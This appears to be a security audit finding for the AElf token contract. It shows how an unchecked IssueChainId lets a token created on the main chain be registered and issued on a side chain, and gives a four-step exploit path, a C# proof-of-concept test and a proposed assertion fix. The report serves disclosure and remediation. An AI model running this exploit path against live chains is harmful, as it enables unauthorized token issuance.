# Audit Report

## Title
IssueChainId Manipulation Allows Unauthorized Token Issuance on Side Chains

## Summary
The `Create` method in TokenContract accepts arbitrary `IssueChainId` values without validating they match the current chain ID. This allows attackers to create tokens on the main chain with `IssueChainId` pointing to a side chain, register them via `CrossChainCreateToken`, and bypass side chain token creation restrictions to issue tokens directly on side chains.

## Finding Description

The vulnerability originates in the `CreateToken` method where user-provided `IssueChainId` is accepted without proper validation. [1](#0-0) 

When `input.IssueChainId` is zero, it defaults to `Context.ChainId`. However, when non-zero, the provided value is accepted without any assertion that it equals `Context.ChainId`. This is the critical missing validation that enables the exploit.

Side chains implement a protection mechanism to prevent direct token creation after initialization. [2](#0-1) 

This check ensures tokens cannot be created directly on side chains once `State.SideChainCreator.Value` is set. The `SideChainCreator` is initialized during side chain setup [3](#0-2)  and can only be set by privileged contracts. [4](#0-3) 

However, an attacker can bypass this protection through the following exploit path:

**Step 1 - Main Chain Token Creation:** On the main chain (where `SideChainCreator` is null), call `Create` with `IssueChainId` set to a target side chain's ID. The side chain protection check passes because it only exists on side chains.

**Step 2 - Main Chain Validation:** Call `ValidateTokenInfoExists` to prepare for cross-chain registration. This method validates token property consistency but does not verify that `IssueChainId` equals the current chain ID. [5](#0-4) 

**Step 3 - Side Chain Registration:** On the side chain, call `CrossChainCreateToken` with merkle proof. This method directly copies the `IssueChainId` from the validated transaction without semantic validation. [6](#0-5) 

**Step 4 - Side Chain Issuance:** Call `Issue` on the side chain. The validation check passes because both `tokenInfo.IssueChainId` and `Context.ChainId` equal the side chain ID. [7](#0-6) 

The attack succeeds because the token was created with manipulated metadata on the main chain, then legitimately registered on the side chain through the cross-chain mechanism, allowing it to bypass the intended restriction.

## Impact Explanation

**Supply Integrity Violation:**
Attackers can issue unlimited tokens (up to `TotalSupply`) directly on side chains without corresponding economic activity on the main chain. This violates the fundamental cross-chain security model where only governance-approved tokens should be issued on side chains.

**Bypass of Access Controls:**
The `SideChainCreator` check is specifically designed to prevent unauthorized token creation on side chains. Comparing with the legitimate side chain token creation path [8](#0-7) , we see that properly created side chain tokens also have `IssueChainId` set to the side chain ID, but this requires governance approval through the `CreateSideChain` flow. The exploit completely circumvents this protection by using manipulated metadata and the legitimate cross-chain registration mechanism as a backdoor.

**Cross-Chain State Inconsistency:**
Token supply on the side chain can be inflated independently of the main chain, breaking accounting invariants and economic assumptions about token origins. This creates discrepancies where the same token exists on multiple chains with inconsistent supply tracking.

**Deceptive Legitimacy:**
Tokens registered via `CrossChainCreateToken` appear to be officially created through proper cross-chain mechanisms, potentially deceiving users into trusting malicious tokens that bypass intended security controls.

## Likelihood Explanation

**Accessible Entry Point:**
The `Create` method is public and accessible to any user who possesses a seed NFT or is in the creation whitelist. [9](#0-8) 

**Realistic Preconditions:**
- Seed NFTs can be purchased through standard mechanisms
- Side chain IDs are publicly available information  
- Cross-chain infrastructure is operationally active in standard configurations
- No special privileges or timing requirements needed

**Straightforward Execution:**
The four-step exploit path uses only standard, documented contract methods (`Create`, `ValidateTokenInfoExists`, `CrossChainCreateToken`, `Issue`). No complex race conditions, timing attacks, or protocol edge cases are required.

**Economic Viability:**
Cost is limited to seed NFT purchase and transaction fees, while the benefit is the ability to issue arbitrary token amounts (up to `TotalSupply`) on side chains. This creates strong economic incentive for exploitation.

## Recommendation

Add validation in the `CreateToken` method to ensure that when `input.IssueChainId` is non-zero, it must equal `Context.ChainId`:

```csharp
private Empty CreateToken(CreateInput input, SymbolType symbolType = SymbolType.Token)
{
    AssertValidCreateInput(input, symbolType);
    if (symbolType == SymbolType.Token || symbolType == SymbolType.NftCollection)
    {
        // can not call create on side chain
        Assert(State.SideChainCreator.Value == null,
            "Failed to create token if side chain creator already set.");
        // ... seed NFT checks ...
    }

    // ADD THIS VALIDATION:
    Assert(input.IssueChainId == 0 || input.IssueChainId == Context.ChainId,
        "IssueChainId must match current chain ID.");

    var tokenInfo = new TokenInfo
    {
        Symbol = input.Symbol,
        TokenName = input.TokenName,
        TotalSupply = input.TotalSupply,
        Decimals = input.Decimals,
        Issuer = input.Issuer,
        IsBurnable = input.IsBurnable,
        IssueChainId = input.IssueChainId == 0 ? Context.ChainId : input.IssueChainId,
        ExternalInfo = input.ExternalInfo ?? new ExternalInfo(),
        Owner = input.Owner
    };
    // ... rest of method ...
}
```

This ensures that tokens can only be created with `IssueChainId` matching the chain they're created on, preventing the cross-chain metadata manipulation exploit.

## Proof of Concept

```csharp
[Fact]
public async Task IssueChainId_Manipulation_Exploit_Test()
{
    // Setup: Create main chain and side chain
    var sideChainId = await GenerateSideChainAsync();
    await RegisterSideChainContractAddressOnMainChainAsync();
    
    // Step 1: On main chain, create token with IssueChainId set to side chain ID
    var maliciousTokenSymbol = "EVIL";
    var createInput = new CreateInput
    {
        Symbol = maliciousTokenSymbol,
        TokenName = "Evil Token",
        TotalSupply = 1000000,
        Decimals = 8,
        Issuer = DefaultAccount.Address,
        IsBurnable = true,
        IssueChainId = sideChainId, // Malicious: Set to side chain ID
        Owner = DefaultAccount.Address
    };
    
    var createResult = await TokenContractStub.Create.SendAsync(createInput);
    createResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Step 2: Validate token exists on main chain
    var tokenInfo = await TokenContractStub.GetTokenInfo.CallAsync(
        new GetTokenInfoInput { Symbol = maliciousTokenSymbol });
    tokenInfo.IssueChainId.ShouldBe(sideChainId); // Confirms manipulation
    
    // Step 3: Register token on side chain via CrossChainCreateToken
    var validateTx = TokenContractStub.ValidateTokenInfoExists.GetTransaction(
        new ValidateTokenInfoExistsInput
        {
            Symbol = tokenInfo.Symbol,
            TokenName = tokenInfo.TokenName,
            TotalSupply = tokenInfo.TotalSupply,
            Decimals = tokenInfo.Decimals,
            Issuer = tokenInfo.Issuer,
            IsBurnable = tokenInfo.IsBurnable,
            IssueChainId = tokenInfo.IssueChainId, // Passes malicious IssueChainId
            Owner = tokenInfo.Owner
        });
    
    var blockExecutedSet = await MineAsync(new List<Transaction> { validateTx });
    var merklePath = GetTransactionMerklePathAndRoot(validateTx, out var blockRoot);
    await IndexMainChainTransactionAsync(blockExecutedSet.Height, blockRoot, blockRoot);
    
    var crossChainResult = await SideChainTokenContractStub.CrossChainCreateToken.SendAsync(
        new CrossChainCreateTokenInput
        {
            FromChainId = MainChainId,
            ParentChainHeight = blockExecutedSet.Height,
            TransactionBytes = validateTx.ToByteString(),
            MerklePath = merklePath
        });
    crossChainResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Step 4: Issue tokens on side chain - THIS SHOULD FAIL BUT SUCCEEDS
    var issueResult = await SideChainTokenContractStub.Issue.SendAsync(new IssueInput
    {
        Symbol = maliciousTokenSymbol,
        Amount = 1000,
        To = SideChainTestKit.DefaultAccount.Address,
        Memo = "Exploited issuance"
    });
    
    // Vulnerability: Issue succeeds on side chain even though token wasn't
    // created through proper governance-approved side chain creation flow
    issueResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    var balance = await SideChainTokenContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Symbol = maliciousTokenSymbol,
        Owner = SideChainTestKit.DefaultAccount.Address
    });
    balance.Balance.ShouldBe(1000); // Confirms unauthorized issuance succeeded
}
```

### Citations

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L24-24)
```csharp
        SetSideChainCreator(input.Creator);
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L54-55)
```csharp
            Assert(State.SideChainCreator.Value == null,
                "Failed to create token if side chain creator already set.");
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L56-65)
```csharp
            if (!IsAddressInCreateWhiteList(Context.Sender) &&
                input.Symbol != TokenContractConstants.SeedCollectionSymbol)
            {
                var symbolSeed = State.SymbolSeedMap[input.Symbol.ToUpper()];
                CheckSeedNFT(symbolSeed, input.Symbol);
                // seed nft for one-time use only
                long balance = State.Balances[Context.Sender][symbolSeed];
                DoTransferFrom(Context.Sender, Context.Self, Context.Self, symbolSeed, balance, "");
                Burn(Context.Self, symbolSeed, balance);
            }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L76-76)
```csharp
            IssueChainId = input.IssueChainId == 0 ? Context.ChainId : input.IssueChainId,
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L159-159)
```csharp
        Assert(tokenInfo.IssueChainId == Context.ChainId, "Unable to issue token with wrong chainId.");
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L444-447)
```csharp
        var validationResult = tokenInfo.TokenName == input.TokenName &&
                               tokenInfo.IsBurnable == input.IsBurnable && tokenInfo.Decimals == input.Decimals &&
                               tokenInfo.Issuer == input.Issuer && tokenInfo.TotalSupply == input.TotalSupply &&
                               tokenInfo.IssueChainId == input.IssueChainId && tokenInfo.Owner == input.Owner;
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L500-500)
```csharp
            IssueChainId = validateTokenInfoExistsInput.IssueChainId,
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Fees.cs (L1138-1140)
```csharp
        Assert(Context.Sender == Context.GetZeroSmartContractAddress() ||
               Context.Sender == State.ParliamentContract.GetDefaultOrganizationAddress.Call(new Empty()),
            "No permission.");
```

**File:** contract/AElf.Contracts.CrossChain/CrossChainContract_Helper.cs (L190-190)
```csharp
            IssueChainId = chainId,
```
